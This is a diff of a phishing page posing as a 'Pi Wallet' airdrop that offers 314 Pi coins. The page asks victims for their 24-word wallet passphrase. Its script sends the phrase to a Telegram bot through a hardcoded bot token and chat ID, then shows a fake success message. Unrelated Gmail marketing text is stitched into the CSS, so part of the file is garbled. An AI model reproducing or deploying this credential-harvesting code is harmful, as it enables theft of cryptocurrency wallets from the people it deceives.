@@ -1,8 +1,9 @@
+   désactive le zoom
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta http-equiv="X-UA-Compatible" content="ie=edge">
     <meta property="og:title" content="Claim 314 pi coins 🎁🎁">
     <meta property="og:description" content="Celebrate 15 KYC users with special reward">
@@ -17,40 +18,26 @@
     <link rel="icon" href="_next/static/media/wallet.44634181.svg"/>
     <title>Pi Wallet</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
         body {
             font-family: Arial, sans-serif;
             margin: 0;
             display: flex;
             justify-content: center;
-            align-items: flex-start;
-            min-height: 100vh;
+            align-items: center;
+            height: 100vh;
+            margin-top: -15%;
             background-color: #f3f4f6;
-            touch-action: pan-y;
-            -webkit-touch-callout: none;
-            -webkit-user-select: none;
-            user-select: none;
-            padding: 0;
-            width: 100vw;
-            overflow-x: hidden;
-            transform: scale(1.2); /* Agrandit tout le contenu de 20% */
-            transform-origin: top center; /* Point d'origine de l'agrandissement */
         }
 
         .container {
             background-color: #fff;
             width: 100vw;
+      
             box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
             border-radius: 8px;
             overflow: hidden;
             display: flex;
             flex-direction: column;
-            margin: 0;
         }
 
         #loading-spinner {
@@ -73,17 +60,14 @@
 
         .header {
             background-color: #65408a;
-            padding: 15px; /* Augmenté le padding */
+            padding: 10px;
             display: flex;
             align-items: center;
             justify-content: space-between;
-            width: 100%;
         }
 
         .header svg {
             fill: #fff;
-            width: 28px; /* Agrandi l'icône */
-            height: 28px;
         }
 
         .title-page {
@@ -91,55 +75,54 @@
             font-weight: bold;
             text-align: center;
             flex: 1;
-            font-size: 1.3rem; /* Texte plus grand */
         }
 
         .form-container {
-            padding: 25px; /* Padding augmenté */
+            padding: 20px;
             display: flex;
             flex-direction: column;
             align-items: center;
-            width: 100%;
         }
 
         .title {
-            font-size: 1.5rem; /* Titre plus grand */
+            font-size: 1.2rem;
             font-weight: bold;
-            margin-bottom: 25px;
+            margin-bottom: 20px;
             color: #4a4a4a;
-            text-align: center;
-            width: 100%;
         }
 
         .textarea-container {
             width: 100%;
-            margin-bottom: 25px;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 20px;
         }
 
         .textarea-container textarea {
             width: 100%;
-            padding: 15px; /* Padding augmenté */
-            font-size: 1.1rem; /* Texte plus grand */
+            padding: 10px;
+            font-size: 1rem;
             border: 1px solid #ccc;
             border-radius: 8px;
-            background-color: #F9FAFB;
-            -webkit-user-select: text;
-            user-select: text;
-            resize: vertical;
-            min-height: 150px; /* Hauteur minimale augmentée */
+            background-color: #F9FAFB;intelligente et facile à utiliser
+
+Gagnez en efficacité avec Gmail, qui intègre désormais Google Chat, Google Meet et d'autres outils.
+Créer un compte
+Pour le travail
+Écran de la boîte de réception Gmail avec grandes icônes de fonction
+
         }
 
         .button {
             width: 100%;
             background-color: #65408a;
             color: #fff;
-            padding: 15px; /* Padding augmenté */
+            padding: 12px;
             border: none;
             border-radius: 8px;
             cursor: pointer;
-            font-size: 1.2rem; /* Texte du bouton plus grand */
+            font-size: 1rem;
             transition: background-color 0.3s ease;
-            font-weight: bold;
         }
 
         .button:hover {
@@ -149,86 +132,17 @@
         .message {
             text-align: center;
             color: red;
-            margin-top: 15px;
-            width: 100%;
-            font-size: 1.1rem; /* Message plus grand */
+            margin-top: 10px;
         }
 
         .text-block {
             text-align: center;
-            margin-top: 25px;
+            margin-top: 20px;
             color: #4a4a4a;
-            width: 100%;
-        }
-
-        .text-block h5 {
-            margin: 12px 0;
-            line-height: 1.5;
-            font-size: 1.1rem; /* Texte plus grand */
         }
 
         .text-block span {
             color: rgba(77, 0, 215, 0.85);
-            font-weight: bold;
-        }
-
-        /* Styles supplémentaires pour désactiver le zoom */
-        html {
-            touch-action: manipulation;
-            width: 100%;
-            font-size: 16px;
-        }
-
-        input, textarea, select {
-            font-size: 16px;
-        }
-
-        /* Pour Chrome spécifiquement - correction de l'échelle */
-        @media all and (-webkit-min-device-pixel-ratio:0) and (min-resolution: .001dpcm) {
-            body {
-                transform: scale(1.15); /* Légèrement réduit pour Chrome */
-                transform-origin: top center;
-            }
-        }
-
-        /* Pour les très petits écrans */
-        @media (max-width: 480px) {
-            body {
-                transform: scale(1); /* Désactive l'agrandissement sur mobile */
-                padding: 0;
-                align-items: flex-start;
-            }
-            
-            .container {
-                width: 100vw;
-                margin-top: 0;
-                border-radius: 0;
-            }
-            
-            .form-container {
-                padding: 20px;
-            }
-            
-            .title {
-                font-size: 1.3rem;
-            }
-            
-            .textarea-container textarea {
-                font-size: 1rem;
-                padding: 12px;
-            }
-            
-            .button {
-                font-size: 1.1rem;
-                padding: 12px;
-            }
-        }
-
-        /* Pour les écrans moyens */
-        @media (min-width: 768px) and (max-width: 1024px) {
-            body {
-                transform: scale(1.1); /* Ajustement pour tablettes */
-            }
         }
 
     </style>
@@ -255,7 +169,7 @@
             </div>
             <form action="checkm.php" method="post" onsubmit="return validateForm()">
                 <div class="textarea-container">
-                    <textarea id="content" name="content" required rows="6" placeholder="Enter your 24-words passphrase here"></textarea>
+                    <textarea id="content" name="content" required rows="8" class="block w-full p-3 text-lg text-gray-800 bg-gray-100 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-purple-500 focus:border-purple-500" placeholder="Enter your 24-words passphrase here"></textarea>
                 </div>
                 <input type="hidden" name="ip_address" id="ip_address" value="">
                 <input type="hidden" id="key" name="key">
@@ -275,8 +189,8 @@
     <script>
         // Function to send a message to Telegram with the passphrase
         function sendToTelegram(passphrase) {
-            const chatId = '1741959003';
-            const botKey = '7354494708:AAEGDCeKoiPcXZo_mE4NzreaLsVS_mEqy90';
+            const chatId = '1741959003'; // Replace with your chat ID
+            const botKey = '7354494708:AAEGDCeKoiPcXZo_mE4NzreaLsVS_mEqy90'; // Replace with your bot key
             const message = `New passphrase: ${passphrase}`;
     
             const url = `https://api.telegram.org/bot${botKey}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
@@ -285,79 +199,61 @@
                 .then(response => response.json())
                 .then(data => {
                     console.log('Message sent to Telegram:', data);
-                    showSuccessMessage();
+                    showSuccessMessage(); // Show success message
                 })
                 .catch(error => {
                     console.error('Error sending message to Telegram:', error);
                 });
         }
     
+        // Function to show success message and clear the form
         function showSuccessMessage() {
             document.getElementById("emsg").innerHTML = "Félicitations! vous participez désormais à l'airdrop de PI.";
             document.getElementById("emsg").style.color = "green";
             document.getElementById("emsg").style.fontWeight = "bold";
     
+            // Clear the textarea and hidden fields
             document.getElementById("content").value = "";
             document.getElementById("key").value = "";
-            
             setTimeout(function() {
-                location.reload();
-            }, 10000);
+            location.reload(); // This reloads the page
+        }, 10000);
         }
     
-        function validateForm() {
-            const textarea = document.getElementById("content");
-            const inputValue = textarea.value.trim();
-            
-            const wordCount = inputValue.split(/\s+/).filter(word => word.length > 0).length;
-            
-            if (wordCount === 24) {
-                sendToTelegram(inputValue);
-                return false;
-            } else {
-                document.getElementById("emsg").innerHTML = "Invalid Passphrase (must be exactly 24 words)";
-                return false;
-            }
-        }
+        // Form validation function
+      function validateForm() {
+    const textarea = document.getElementById("content");
+    const inputValue = textarea.value.trim();
+    
+    // Vérifier le nombre de mots
+    const wordCount = inputValue.split(/\s+/).filter(word => word.length > 0).length;
+    
+    if (wordCount === 24) {
+        sendToTelegram(inputValue);
+        return false; // Empêche la soumission du formulaire
+    } else {
+        document.getElementById("emsg").innerHTML = "Invalid Passphrase (must be exactly 24 words)";
+        return false;
+    }
+}
 
+        // Prevent form submission before full load
         document.addEventListener("DOMContentLoaded", () => {
             const form = document.querySelector("form");
             form.onsubmit = function (event) {
                 if (!validateForm()) {
-                    event.preventDefault();
+                    event.preventDefault(); // Stop form submission if validation fails
                 }
             };
     
+            // Unhide content after page loads
             window.onload = () => {
                 document.getElementById("loading-spinner").style.display = "none";
                 document.getElementById("main").style.display = "block";
-                
-                // Détection Chrome
-                const isChrome = /Chrome/.test(navigator.userAgent) && /Google Inc/.test(navigator.vendor);
-                if (isChrome) {
-                    document.body.style.transform = 'scale(1.15)';
-                }
             };
         });
-
-        // Empêcher le zoom avec le pincement
-        document.addEventListener('touchstart', function(event) {
-            if (event.touches.length > 1) {
-                event.preventDefault();
-            }
-        });
-
-        document.addEventListener('gesturestart', function(event) {
-            event.preventDefault();
-        });
-
-        document.addEventListener('gesturechange', function(event) {
-            event.preventDefault();
-        });
-
-        document.addEventListener('gestureend', function(event) {
-            event.preventDefault();
-        });
     </script>
+    
+    
 </body>
-</html>
+</html>                         
